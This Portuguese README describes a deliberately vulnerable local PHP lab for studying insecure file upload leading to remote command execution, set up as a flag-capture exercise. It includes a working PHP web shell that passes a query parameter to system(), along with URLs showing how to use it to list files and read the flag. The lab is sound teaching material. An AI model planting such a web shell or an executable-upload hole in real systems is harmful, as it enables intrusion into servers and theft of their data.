# File Upload RCE Lab - PHP

Laboratório local e intencionalmente vulnerável para estudar upload inseguro de arquivo PHP e execução remota de comandos.

A aplicação permite enviar um arquivo `.php` para um diretório público. Como o Apache/PHP executa arquivos `.php` nesse diretório, o arquivo enviado pode executar comandos dentro do container.

## Rodando com Docker Compose ou Podman compatível

Com a flag padrão:

```bash
docker compose up --build
```

Passando uma flag personalizada na hora de subir o container:

```bash
FLAG_VALUE='minha-flag-personalizada' docker compose up --build
```

Acesse:

```text
http://localhost:5000
```

A flag é escrita automaticamente em:

```text
/var/www/html/uploads/flag.txt
```

Dentro do shell enviado por upload, `ls` deve mostrar `flag.txt`, e `cat flag.txt` deve ler a flag.

## Rodando com Podman sem Compose

Com a flag padrão:

```bash
podman build -t file-upload-rce-lab-php .
podman run --rm -p 5000:80 file-upload-rce-lab-php
```

Passando uma flag personalizada:

```bash
podman build -t file-upload-rce-lab-php .
podman run --rm -p 5000:80 -e FLAG_VALUE='minha-flag-personalizada' file-upload-rce-lab-php
```

## Payload de upload

Crie um arquivo chamado `shell.php`:

```php
<?php
$cmd = $_GET['cmd'] ?? 'id';
echo '<pre>';
system($cmd);
echo '</pre>';
?>
```

Envie o arquivo no formulário da aplicação.

## Exploração

Depois do upload, acesse:

```text
http://localhost:5000/uploads/shell.php?cmd=ls
```

Isso deve listar os arquivos do diretório `uploads`, incluindo:

```text
flag.txt
shell.php
```

Depois leia a flag:

```text
http://localhost:5000/uploads/shell.php?cmd=cat%20flag.txt
```

## Parando e apagando o container

Na pasta do projeto:

```bash
docker compose down
```

Para apagar também a imagem criada pelo build:

```bash
docker compose down --rmi local
```

## Observação de segurança

Este projeto é propositalmente vulnerável. Use somente em ambiente local ou controlado.
Não permita upload e execução de arquivos enviados por usuários em sistemas reais.
